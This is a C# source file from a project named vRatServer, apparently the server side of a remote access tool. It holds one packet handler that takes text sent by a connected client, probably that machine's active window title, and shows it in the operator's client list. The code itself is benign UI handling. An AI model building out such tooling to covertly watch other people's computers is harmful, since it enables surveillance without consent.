using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;
using vRatServer.Classes;

namespace vRatServer.Packets
{
    class windowUpdatePacket
    {
        public windowUpdatePacket(Client cli,byte[] data)
        {
            string txt = Encoding.Unicode.GetString(data);
            Program.f1.BeginInvoke((MethodInvoker)delegate
            {
                foreach (ListViewItem item in Program.f1.listView1.Items)
                {
                    Client client = (Client)item.Tag;
                    if(client.Name==cli.Name && client.ip == cli.ip)
                    {
                        item.SubItems[6].Text = txt;
                    }


                }

            });

        }
    }
}
